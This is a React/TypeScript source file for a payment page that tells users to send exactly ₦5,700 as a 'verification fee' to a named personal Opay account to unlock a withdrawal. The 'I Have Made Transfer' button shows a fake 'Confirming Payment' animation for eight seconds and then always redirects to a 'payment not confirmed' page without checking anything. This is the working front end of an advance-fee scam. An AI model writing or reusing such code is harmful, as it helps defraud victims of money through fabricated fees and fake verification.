import { ArrowLeft, Copy } from "lucide-react";
import { Link, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { useState } from "react";

const TransferPage = () => {
  const navigate = useNavigate();
  const [isConfirming, setIsConfirming] = useState(false);

  const handleTransfer = () => {
    setIsConfirming(true);
    // Show confirming payment for 8 seconds
    setTimeout(() => {
      navigate("/payment-not-confirmed");
    }, 8000);
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
  };

  if (isConfirming) {
    return (
      <div className="min-h-screen flex items-center justify-center relative overflow-hidden p-3 max-w-md mx-auto">
        <div className="absolute inset-0 animated-bg"></div>
        <div className="relative z-10 bg-black/40 backdrop-blur-lg rounded-2xl p-8 text-center space-y-6 w-full border border-purple-700/40">
          {/* Loading Animation */}
          <div className="flex justify-center">
            <div className="w-24 h-24 relative">
              <div className="absolute inset-0 border-4 border-purple-500/30 rounded-full"></div>
              <div className="absolute inset-0 border-4 border-purple-500 border-t-transparent rounded-full animate-spin"></div>
            </div>
          </div>

          <div className="space-y-2">
            <h2 className="text-2xl font-bold text-yellow-400">
              Confirming Payment
            </h2>
            <p className="text-gray-300">
              Please wait while we verify your transfer...
            </p>
          </div>

          <div className="flex justify-center space-x-1">
            <div
              className="w-2 h-2 bg-yellow-400 rounded-full animate-bounce"
              style={{ animationDelay: "0s" }}
            ></div>
            <div
              className="w-2 h-2 bg-yellow-400 rounded-full animate-bounce"
              style={{ animationDelay: "0.2s" }}
            ></div>
            <div
              className="w-2 h-2 bg-yellow-400 rounded-full animate-bounce"
              style={{ animationDelay: "0.4s" }}
            ></div>
          </div>
        </div>

        <style>{`
          @keyframes gradientMove {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
          }
          .animated-bg {
            background: linear-gradient(-45deg, #0a0015, #1a0030, #3b0066, #000000);
            background-size: 400% 400%;
            animation: gradientMove 12s ease infinite;
          }
        `}</style>
      </div>
    );
  }

  return (
    <div className="min-h-screen relative overflow-hidden p-3 max-w-md mx-auto">
      {/* Animated background */}
      <div className="absolute inset-0 animated-bg"></div>

      {/* Content */}
      <div className="relative z-10">
        {/* Header */}
        <div className="flex items-center mb-6 pt-2">
          <Link to="/dashboard" className="mr-3">
            <ArrowLeft className="w-6 h-6 text-white" />
          </Link>
          <h1 className="text-lg font-semibold text-white">
            Complete Payment
          </h1>
        </div>

        <div className="space-y-4">
          {/* Amount Card */}
          <div className="bg-black/40 backdrop-blur-lg rounded-2xl p-6 text-center border border-purple-700/40 shadow-lg">
            <p className="text-sm text-gray-400 mb-2">Transfer Amount</p>
            <div className="flex justify-center items-center space-x-2 mb-1">
              <p className="text-4xl font-bold text-yellow-400">₦5,700</p>
              <Copy
                className="w-5 h-5 text-yellow-400 cursor-pointer hover:text-yellow-300"
                onClick={() => copyToClipboard("5700")}
              />
            </div>
            <p className="text-xs text-gray-400">Verification Fee</p>
          </div>

          {/* Bank Details Card */}
          <div className="bg-white/10 backdrop-blur-lg rounded-2xl p-6 space-y-4 border border-purple-700/40">
            <div className="text-center mb-4">
              <h2 className="text-lg font-semibold text-white mb-1">
                Transfer to:
              </h2>
              <p className="text-sm text-gray-300">
                Complete this transfer to proceed
              </p>
            </div>

            {/* Horizontal Bank Info */}
            <div className="flex flex-col bg-black/30 rounded-xl p-4 border border-purple-700/40 space-y-3">
              <div className="flex justify-between items-center border-b border-purple-700/40 pb-2">
                <span className="text-sm text-gray-400">Bank:</span>
                <span className="font-semibold text-white">Opay</span>
              </div>

              <div className="flex justify-between items-center border-b border-purple-700/40 pb-2">
                <span className="text-sm text-gray-400">Account Number:</span>
                <div className="flex items-center space-x-2">
                  <span className="font-bold text-white">8102562883</span>
                  <Copy
                    className="w-4 h-4 text-yellow-400 cursor-pointer hover:text-yellow-300"
                    onClick={() => copyToClipboard("8102562883")}
                  />
                </div>
              </div>

              <div className="flex justify-between items-center">
                <span className="text-sm text-gray-400">Account Name:</span>
                <span className="font-semibold text-white text-right">
                  Veronica Chisom Benjamin
                </span>
              </div>
            </div>

            {/* Important Notice */}
            <div className="bg-yellow-50/10 border border-yellow-400 rounded-lg p-4 mt-4 backdrop-blur-md">
              <p className="text-sm text-yellow-300 font-medium">
                ⚠️ Important: Transfer exactly ₦5,700 to the account above to
                verify your withdrawal request.
              </p>
            </div>
          </div>

          {/* Action Button Only */}
          <Button
            onClick={handleTransfer}
            className="w-full bg-yellow-500 hover:bg-yellow-600 text-black font-semibold py-4 rounded-full text-lg"
          >
            I Have Made Transfer
          </Button>
        </div>
      </div>

      {/* Inline background animation */}
      <style>{`
        @keyframes gradientMove {
          0% { background-position: 0% 50%; }
          50% { background-position: 100% 50%; }
          100% { background-position: 0% 50%; }
        }
        .animated-bg {
          background: linear-gradient(-45deg, #0a0015, #1a0030, #3b0066, #000000);
          background-size: 400% 400%;
          animation: gradientMove 12s ease infinite;
        }
      `}</style>
    </div>
  );
};

export default TransferPage;
